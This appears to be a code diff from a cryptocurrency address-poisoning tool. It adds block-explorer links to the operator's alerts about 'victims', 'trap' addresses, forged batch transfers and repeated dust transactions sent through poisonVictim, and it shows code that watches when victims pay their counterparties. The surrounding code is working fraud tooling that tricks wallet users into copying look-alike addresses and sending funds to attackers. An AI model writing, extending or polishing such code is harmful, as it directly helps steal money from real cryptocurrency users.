@@ -1368,6 +1368,16 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
   return run;
 }
 
+// ─── Explorer URL Helper ───
+function getExplorerUrl(address, type = 'address') {
+  let baseUrl = 'https://etherscan.io';
+  if (chainName === 'bsc') baseUrl = 'https://bscscan.com';
+  else if (chainName === 'polygon') baseUrl = 'https://polygonscan.com';
+
+  if (type === 'tx') return `${baseUrl}/tx/${address}`;
+  return `${baseUrl}/address/${address}#tokentxns`;
+}
+
 async function sendBatchAlert(items, txHash, contractAddress) {
   if (items.length === 0) return;
 
@@ -1378,15 +1388,24 @@ async function sendBatchAlert(items, txHash, contractAddress) {
     const decimals = getDecimals(item.detectedAsset || 'ETH');
     const amountDisplay = (Number(item.rawValue) / (10 ** decimals)).toFixed(4);
     const icon = item.type === 'counter' ? '🏆' : '🪞';
-    return `${icon} ${idx + 1}. \`${item.victimAddress.slice(0, 10)}...\` → \`${item.trapAddress.slice(0, 10)}...\` (${amountDisplay} ${item.detectedAsset || '?'})`;
+
+    const victimUrl = getExplorerUrl(item.victimAddress);
+    const trapUrl = getExplorerUrl(item.trapAddress);
+
+    return `${icon} *${idx + 1}.* (${amountDisplay} ${item.detectedAsset || '?'})\n` +
+      `👤 Victim: \`${item.victimAddress}\`\n🔗 ${victimUrl}\n` +
+      `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`;
   });
 
   const typeLabel = items.some(i => i.type === 'counter') ? 'Counter-Poison' : 'Auto-Poison';
+  const txUrl = getExplorerUrl(txHash, 'tx');
+  const contractUrl = getExplorerUrl(contractAddress);
+
   const msg =
-    `⚡ Batch ${typeLabel} — ${items.length} transfers in 1 TX!\n\n` +
-    lines.join('\n') +
-    `\n\n📦 Contract: \`${contractAddress.slice(0, 10)}...\`\n` +
-    `🔗 TX: \`${txHash}\``;
+    `⚡ *Batch ${typeLabel}* — ${items.length} transfers in 1 TX!\n\n` +
+    lines.join('\n\n') +
+    `\n\n📦 Contract: \`${contractAddress}\`\n🔗 ${contractUrl}\n` +
+    `\n🔗 TX: ${txUrl}`;
 
   try {
     await sendAlert(msg, 'success', campaignId);
@@ -1464,14 +1483,20 @@ async function poisonVictim(victimAddress, privateKey, campaignId, asset = null)
     }
   }
 
-  const txHashMsg = txHash ? `\n🔗 TX: ${txHash}` : '';
+  const victimUrl = getExplorerUrl(victimAddress);
+  const txUrl = txHash ? getExplorerUrl(txHash, 'tx') : '';
   const statusMsg = successCount > 0 ? 'Re‑poison complete' : 'Re‑poison failed';
-  const msg = `${statusMsg}: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
-  logger.info(msg);
+
+  const msg = `♻️ *${statusMsg}*\n\n` +
+    `👤 Victim: \`${victimAddress}\`\n🔗 ${victimUrl}\n` +
+    `📊 Sent: ${successCount}/${DUST_RETRIES} dust tx` +
+    (txUrl ? `\n\n🔗 TX: ${txUrl}` : '');
+
+  logger.info(`Re-poison ${statusMsg}: ${successCount}/${DUST_RETRIES} to ${victimAddress}`);
 
   if (successCount > 0) {
     try {
-      await sendAlert(`♻️ ${msg}`, 'info', campaignId);
+      await sendAlert(msg, 'info', campaignId);
     } catch (err) {
       logger.warn(`Failed to send re-poison summary alert: ${err.message}`);
     }
@@ -1657,7 +1682,16 @@ function checkTransaction(tx, txLogs = []) {
       logger.info(`Victim ${from} sent to ${counterpartyMsg}: ${tx.hash}`);
 
       try {
-        await sendAlert(`🔔 Victim targeting counterparty\nVictim: ${from}\nCounterparty: ${counterpartyMsg}\nTX: ${tx.hash}`, 'info', entry.campaignId);
+        const victimUrl = getExplorerUrl(from);
+        const counterpartyUrl = entry.counterparty ? getExplorerUrl(entry.counterparty) : '';
+        const txUrl = getExplorerUrl(tx.hash, 'tx');
+
+        const alertMsg = `🔔 *Victim targeting counterparty*\n\n` +
+          `👤 Victim: \`${from}\`\n🔗 ${victimUrl}\n\n` +
+          `🎯 Counterparty: \`${counterpartyMsg}\`\n${counterpartyUrl ? `🔗 ${counterpartyUrl}\n` : ''}\n` +
+          `🔗 TX: ${txUrl}`;
+
+        await sendAlert(alertMsg, 'info', entry.campaignId);
       } catch (alertErr) {
         logger.warn(`Failed to send initial alert: ${alertErr.message}`);
       }
